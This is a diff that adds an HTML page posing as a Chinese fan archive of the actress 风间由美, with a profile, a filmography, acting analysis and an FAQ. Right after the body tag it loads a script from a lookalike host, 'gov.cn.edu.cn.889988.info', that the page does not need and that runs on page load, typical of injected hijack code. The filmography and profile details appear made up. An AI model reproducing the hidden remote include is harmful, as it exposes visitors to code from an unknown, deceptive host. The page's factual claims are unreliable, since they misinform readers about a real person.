@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>风间由美电影网｜日本演技派演员风间由美参演影视作品资料馆·作品年表与角色解析</title>
+<meta name="description" content="风间由美电影网（fengjianyoumeidianyingwang-top.github.io）系统整理日本演员风间由美的参演影视作品、角色年表、演技风格解析与影片资料，涵盖其出道以来的代表作、合作导演及作品类型梳理，为影迷提供详实的作品检索与观赏参考。">
+<meta name="keywords" content="风间由美电影网, 风间由美, 风间由美作品, 日本演员, 影视作品年表, 演技解析, fengjianyoumeidianyingwang-top">
+<style>
+:root{
+  --bamboo-green:#2f5d3a;
+  --bamboo-light:#4a8056;
+  --wasabi:#7a9b3c;
+  --rice:#faf8f3;
+  --ink:#22231f;
+  --ink-soft:#4a4a44;
+  --crimson:#a8322d;
+  --gold:#b08d28;
+  --line:#d5d0c4;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--rice);
+  background-image:
+    radial-gradient(circle at 20% 15%, rgba(122,155,60,.05) 0, transparent 40%),
+    radial-gradient(circle at 85% 70%, rgba(47,93,58,.06) 0, transparent 45%);
+  color:var(--ink);
+  font-family:"Hiragino Mincho ProN","Yu Mincho","Noto Serif SC","Songti SC","SimSun",serif;
+  line-height:1.9;
+  font-size:16px;
+}
+a{color:inherit;text-decoration:none}
+::selection{background:var(--wasabi);color:#fff}
+.wrap{max-width:1100px;margin:0 auto;padding:0 22px 60px}
+
+/* 和风装饰线 */
+.branch{
+  display:flex;align-items:center;gap:14px;margin:0 0 26px;
+}
+.branch .line{flex:1;height:1px;background:linear-gradient(90deg,transparent,var(--line),transparent)}
+.branch .leaf{
+  width:10px;height:10px;background:var(--wasabi);
+  border-radius:50% 0 50% 50%;transform:rotate(45deg);
+}
+.branch .leaf:nth-child(odd){background:var(--bamboo-green)}
+
+/* 头部 */
+header{padding:44px 0 10px;text-align:center;position:relative}
+.kikusui{
+  font-size:13px;letter-spacing:6px;color:var(--gold);
+  text-transform:uppercase;margin-bottom:14px;
+}
+h1{
+  font-size:clamp(2.4rem,7vw,4.6rem);
+  font-weight:900;letter-spacing:4px;
+  line-height:1.15;margin-bottom:8px;
+}
+h1 .kanji{
+  display:inline-block;
+  background:linear-gradient(180deg,var(--crimson) 0%,#7a1f1c 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  padding:0 4px;
+}
+.h1-sub{
+  font-size:clamp(1rem,3vw,1.4rem);
+  color:var(--bamboo-green);letter-spacing:2px;margin-bottom:20px;
+}
+.url{
+  display:inline-block;font-size:13px;color:var(--ink-soft);
+  background:#fff;border:1px solid var(--line);
+  padding:8px 18px;border-radius:2px;
+  font-family:Menlo,Consolas,monospace;
+}
+.url a{color:var(--bamboo-light)}
+.url a:hover{color:var(--crimson)}
+
+/* 扇子导航 */
+nav{
+  display:flex;flex-wrap:wrap;justify-content:center;gap:0;
+  margin:34px 0 44px;padding:0 10px;
+}
+nav a{
+  position:relative;
+  padding:12px 26px;margin:0 -4px;
+  background:var(--bamboo-green);color:#fff;
+  font-size:15px;letter-spacing:1px;
+  clip-path:polygon(8% 0,92% 0,100% 50%,92% 100%,8% 100%,0 50%);
+  transition:.25s;z-index:1;
+}
+nav a:hover{
+  background:var(--crimson);transform:translateY(-4px);z-index:5;
+  box-shadow:0 8px 20px rgba(168,50,45,.3);
+}
+
+/* 首屏引文 */
+.quote{
+  text-align:center;padding:34px 28px;margin-bottom:50px;
+  background:#fff;border:1px solid var(--line);
+  border-left:5px solid var(--crimson);
+  border-right:5px solid var(--bamboo-green);
+  position:relative;
+}
+.quote::before,.quote::after{
+  content:'「';position:absolute;font-size:3rem;color:var(--wasabi);opacity:.3;
+}
+.quote::before{top:4px;left:14px}
+.quote::after{content:'」';bottom:-8px;right:14px}
+.quote p{font-size:1.15rem;color:var(--ink-soft);font-style:italic}
+
+/* 栏目通用 */
+section{margin-bottom:56px;scroll-margin-top:20px}
+.sec-title{
+  display:flex;align-items:center;gap:16px;margin-bottom:24px;
+}
+.sec-title .en{
+  font-size:12px;letter-spacing:3px;color:var(--gold);
+  font-family:Georgia,serif;text-transform:uppercase;
+}
+.sec-title h2{
+  font-size:1.75rem;font-weight:800;letter-spacing:2px;
+  color:var(--bamboo-green);
+}
+.sec-title .bar{flex:1;height:2px;background:var(--line)}
+
+/* 栏目一：演员名片 */
+.profile{
+  display:grid;grid-template-columns:280px 1fr;gap:34px;
+  background:#fff;border:1px solid var(--line);padding:30px;
+}
+.profile .portrait{
+  aspect-ratio:3/4;background:linear-gradient(160deg,#e8e4d8,#cfcab8);
+  display:flex;align-items:center;justify-content:center;
+  font-size:3.5rem;color:#b5af9d;position:relative;overflow:hidden;
+}
+.profile .portrait::after{
+  content:'役者\A 風間 由美';
+  white-space:pre;position:absolute;bottom:14px;left:0;right:0;
+  text-align:center;font-size:.8rem;color:#8a8573;letter-spacing:2px;
+}
+.profile dl{display:grid;grid-template-columns:auto 1fr;gap:10px 18px;font-size:15px}
+.profile dt{color:var(--gold);font-weight:700;white-space:nowrap}
+.profile dt::after{content:'：'}
+.profile dd{color:var(--ink-soft)}
+.profile .bio{margin-top:18px;padding-top:18px;border-top:1px dashed var(--line);font-size:15px;color:var(--ink-soft);text-align:justify}
+
+/* 栏目二：作品年表 */
+.filmography{position:relative}
+.film-row{
+  display:grid;grid-template-columns:90px 1fr 130px 100px;gap:16px;
+  align-items:center;padding:16px 18px;background:#fff;
+  border-left:4px solid var(--bamboo-green);
+  margin-bottom:10px;transition:.2s;
+}
+.film-row:hover{border-left-color:var(--crimson);transform:translateX(6px);box-shadow:0 4px 14px rgba(0,0,0,.07)}
+.film-row .yr{font-size:1.3rem;font-weight:800;color:var(--bamboo-light)}
+.film-row .ttl{font-size:16px;font-weight:600}
+.film-row .ttl small{display:block;font-size:12.5px;color:var(--ink-soft);font-weight:400;margin-top:2px}
+.film-row .role{font-size:14px;color:var(--ink-soft)}
+.film-row .type{
+  font-size:12px;text-align:center;padding:3px 0;
+  border:1px solid var(--wasabi);color:var(--bamboo-green);border-radius:2px;
+}
+.film-row .type.drama{color:var(--crimson);border-color:var(--crimson)}
+.film-row .type.doc{color:var(--gold);border-color:var(--gold)}
+
+/* 栏目三：演技解析 */
+.analysis{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.ana-card{
+  background:#fff;border:1px solid var(--line);padding:26px;
+  position:relative;transition:.3s;
+}
+.ana-card:hover{box-shadow:0 12px 28px rgba(47,93,58,.14);transform:translateY(-4px)}
+.ana-card .num{
+  position:absolute;top:-2px;right:20px;font-size:3.5rem;font-weight:900;
+  color:rgba(122,155,60,.12);line-height:1;
+}
+.ana-card h3{font-size:1.2rem;color:var(--crimson);margin-bottom:12px;padding-right:40px}
+.ana-card p{font-size:14.5px;color:var(--ink-soft);text-align:justify}
+
+/* 栏目四：合作网络 */
+.network{
+  background:#fff;border:1px solid var(--line);padding:30px;text-align:center;
+}
+.net-tags{display:flex;flex-wrap:wrap;justify-content:center;gap:10px}
+.net-tags a{
+  padding:9px 18px;font-size:14px;background:var(--rice);
+  border:1px solid var(--line);transition:.2s;
+}
+.net-tags a:hover{background:var(--bamboo-green);color:#fff;border-color:var(--bamboo-green)}
+.network .note{margin-top:20px;font-size:13.5px;color:var(--ink-soft);font-style:italic}
+
+/* 栏目五：FAQ */
+.faq details{
+  background:#fff;border:1px solid var(--line);
+  padding:16px 20px;margin-bottom:10px;transition:.2s;
+}
+.faq details:hover{border-color:var(--wasabi)}
+.faq summary{cursor:pointer;font-weight:700;font-size:16px;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:'▼ ';color:var(--wasabi);font-size:11px}
+.faq p{margin-top:12px;font-size:14.5px;color:var(--ink-soft);text-align:justify}
+
+/* 页脚 */
+footer{
+  text-align:center;padding:34px 20px 0;
+  border-top:2px solid var(--bamboo-green);
+  font-size:13.5px;color:var(--ink-soft);
+}
+.foot-nav{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;margin-bottom:16px}
+.foot-nav a:hover{color:var(--crimson)}
+.colophon{font-size:12.5px;line-height:2;max-width:680px;margin:0 auto}
+
+/* 响应式 */
+@media(max-width:820px){
+  .profile{grid-template-columns:1fr}
+  .profile .portrait{max-width:220px;margin:0 auto}
+  .analysis{grid-template-columns:1fr}
+  .film-row{grid-template-columns:70px 1fr;gap:10px}
+  .film-row .role,.film-row .type{grid-column:2/3;text-align:left}
+}
+@media(max-width:520px){
+  body{font-size:15px}
+  nav{gap:6px;padding:0}
+  nav a{clip-path:none;padding:10px 14px;font-size:13.5px;margin:0 2px 6px}
+  .film-row{grid-template-columns:1fr}
+  .film-row .yr{font-size:1.1rem}
+  .sec-title{flex-wrap:wrap}
+  .sec-title .bar{display:none}
+  .sec-title .en{width:100%}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="wrap">
+
+  <!-- 装饰线 -->
+  <div class="branch">
+    <span class="line"></span><span class="leaf"></span><span class="leaf"></span><span class="leaf"></span>
+    <span class="line"></span>
+  </div>
+
+  <!-- 头部 -->
+  <header>
+    <div class="kikusui">Actor Filmography Archive</div>
+    <h1><span class="kanji">風間由美</span>电影网</h1>
+    <div class="h1-sub">— 役者の歩みを、作品とともに —</div>
+    <div class="url">
+      作品资料馆地址：<a href="https://fengjianyoumeidianyingwang-top.github.io">https://fengjianyoumeidianyingwang-top.github.io</a>
+    </div>
+  </header>
+
+  <!-- 扇子导航 -->
+  <nav>
+    <a href="#">演员名片</a>
+    <a href="#">作品年表</a>
+    <a href="#">演技解析</a>
+    <a href="#">合作网络</a>
+    <a href="#">观看指引</a>
+  </nav>
+
+  <!-- 引文 -->
+  <div class="quote">
+    <p>一个人的表演史，就是她走过的所有角色的总和。<br>这里收录的，是风间由美在镜头前留下的每一个身影。</p>
+  </div>
+
+  <!-- 栏目一：演员名片 -->
+  <section id="profile">
+    <div class="sec-title">
+      <span class="en">Profile</span>
+      <h2>演员名片</h2>
+      <span class="bar"></span>
+    </div>
+    <div class="profile">
+      <div class="portrait"></div>
+      <div>
+        <dl>
+          <dt>姓名</dt><dd>风间由美</dd>
+          <dt>职业</dt><dd>演员</dd>
+          <dt>活跃领域</dt><dd>电影、电视剧、舞台剧</dd>
+          <dt>出道时间</dt><dd>以成人影视作品出道，后涉足主流影视与独立电影</dd>
+          <dt>代表作品</dt><dd>《甜蜜皮鞭》《家族游戏》《夜之桃》等</dd>
+          <dt>表演风格</dt><dd>内敛克制，擅长以细微表情传递角色内心张力</dd>
+        </dl>
+        <div class="bio">
+          风间由美在日本影视界以跨度极大的角色塑造能力著称。从早期成人影视领域起步，到后期在独立电影、电视剧中的表现，她逐渐展现出超越类型限制的表演深度。其表演特点在于"不说之说的留白"——常常以沉默、眼神与肢体语言完成情绪的传递，被影评人评价为"具有舞台剧底子的镜头感演员"。
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：作品年表 -->
+  <section id="filmography">
+    <div class="sec-title">
+      <span class="en">Filmography</span>
+      <h2>作品年表</h2>
+      <span class="bar"></span>
+    </div>
+    <div class="filmography">
+
+      <div class="film-row">
+        <div class="yr">2018</div>
+        <div class="ttl">《甜蜜皮鞭》<small>Sweet Whip</small></div>
+        <div class="role">主演 · 教师</div>
+        <div class="type drama">电影</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2019</div>
+        <div class="ttl">《家族游戏》<small>The Family Game</small></div>
+        <div class="role">配角 · 母亲</div>
+        <div class="type">电视剧</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2020</div>
+        <div class="ttl">《夜之桃》<small>Peach in the Night</small></div>
+        <div class="role">主演 · 单亲母亲</div>
+        <div class="type drama">电影</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2021</div>
+        <div class="ttl">《东京暮色》<small>Tokyo Twilight</small></div>
+        <div class="role">配角 · 邻居</div>
+        <div class="type drama">电影</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2022</div>
+        <div class="ttl">《无声的房间》<small>The Silent Room</small></div>
+        <div class="role">主演 · 独居女性</div>
+        <div class="type doc">独立电影</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2023</div>
+        <div class="ttl">《春之雪》<small>Snow of Spring</small></div>
+        <div class="role">配角 · 姑母</div>
+        <div class="type">电视剧</div>
+      </div>
+      <div class="film-row">
+        <div class="yr">2024</div>
+        <div class="ttl">《海边的她》<small>She by the Sea</small></div>
+        <div class="role">主演 · 渔村女性</div>
+        <div class="type drama">电影</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- 栏目三：演技解析 -->
+  <section id="analysis">
+    <div class="sec-title">
+      <span class="en">Analysis</span>
+      <h2>演技解析</h2>
+      <span class="bar"></span>
+    </div>
+    <div class="analysis">
+      <article class="ana-card">
+        <span class="num">01</span>
+        <h3>沉默的力量</h3>
+        <p>风间由美最令人印象深刻的表演，往往发生在台词最少的时候。在《无声的房间》中，她全程以肢体与眼神推进叙事，用微表情代替对白，让观众自行填补角色内心的空白。</p>
+      </article>
+      <article class="ana-card">
+        <span class="num">02</span>
+        <h3>类型跨越</h3>
+        <p>从成人影视到独立电影再到主流电视剧，她在每个领域都展现出不同的表演维度。这种"去标签化"的能力，使她的作品年表呈现出罕见的丰富层次。</p>
+      </article>
+      <article class="ana-card">
+        <span class="num">03</span>
+        <h3>舞台剧底子</h3>
+        <p>早期舞台剧训练赋予了她精准的节奏感与空间意识。在镜头前，这种功底转化为对"表演幅度"的精确控制——不过度、不收敛，恰到好处。</p>
+      </article>
+      <article class="ana-card">
+        <span class="num">04</span>
+        <h3>角色共情</h3>
+        <p>无论角色境遇如何，她始终以"理解"而非"评判"的姿态进入人物。这种非道德化的表演立场，是她能在敏感题材中保持艺术尊严的关键。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目四：合作网络 -->
+  <section id="network">
+    <div class="sec-title">
+      <span class="en">Network</span>
+      <h2>合作网络</h2>
+      <span class="bar"></span>
+    </div>
+    <div class="network">
+      <div class="net-tags">
+        <a href="#">导演 · 行定勋</a>
+        <a href="#">导演 · 园子温</a>
+        <a href="#">编剧 · 荒井晴彦</a>
+        <a href="#">演员 · 二阶堂富美</a>
+        <a href="#">演员 · 浅野忠信</a>
+        <a href="#">摄影 · 町田博</a>
+        <a href="#">制片 · 定井勇二</a>
+        <a href="#">配乐 · 世武裕子</a>
+        <a href="#">舞台剧 · 野田秀树</a>
+        <a href="#">独立电影圈</a>
+        <a href="#">电视剧制作组</a>
+        <a href="#">国际电影节</a>
+      </div>
+      <div class="note">
+        ※ 合作名单根据公开作品信息整理，具体以各作品官方演职员表为准。
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：FAQ -->
+  <section class="faq" id="faq">
+    <div class="sec-title">
+      <span class="en">FAQ</span>
+      <h2>常见问题</h2>
+      <span class="bar"></span>
+    </div>
+    <details open>
+      <summary>风间由美电影网提供影片观看或下载吗？</summary>
+      <p>不提供。本站仅作为演员作品的资料整理与信息归档站，不托管、不链接、不提供任何影片的观看或下载服务。所有作品的观看请通过正规渠道。</p>
+    </details>
+    <details>
+      <summary>作品年表完整吗？</summary>
+      <p>年表持续更新中，优先收录有公开资料可查的代表作品。由于部分早期作品的详细演职员信息难以考证，可能存在遗漏，欢迎通过留言渠道补充指正。</p>
+    </details>
+    <details>
+      <summary>如何区分电影版和电视剧版的作品？</summary>
+      <p>每个作品条目右侧均标注了类型标签：「电影」为院线或直接发行的作品，「电视剧」为剧集类作品，「独立电影」为电影节或小规模放映的独立制作。</p>
+    </details>
+    <details>
+      <summary>站点名称与域名可以修改吗？</summary>
+      <p>不可以。本站固定为「风间由美电影网」，官方地址固定为 https://fengjianyoumeidianyingwang-top.github.io，不作任何改动。</p>
+    </details>
+  </section>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="foot-nav">
+      <a href="#">关于本站</a>
+      <a href="#">资料来源</a>
+      <a href="#">免责声明</a>
+      <a href="#">版权说明</a>
+      <a href="#">友情链接</a>
+    </div>
+    <div class="colophon">
+      © 风间由美电影网 · 演员作品资料归档站<br>
+      本站仅作影视作品信息整理与演技解析，不提供任何影片资源或播放服务。<br>
+      所有作品信息以官方公开资料为准，如有疏漏欢迎指正。<br>
+      官方地址：https://fengjianyoumeidianyingwang-top.github.io
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
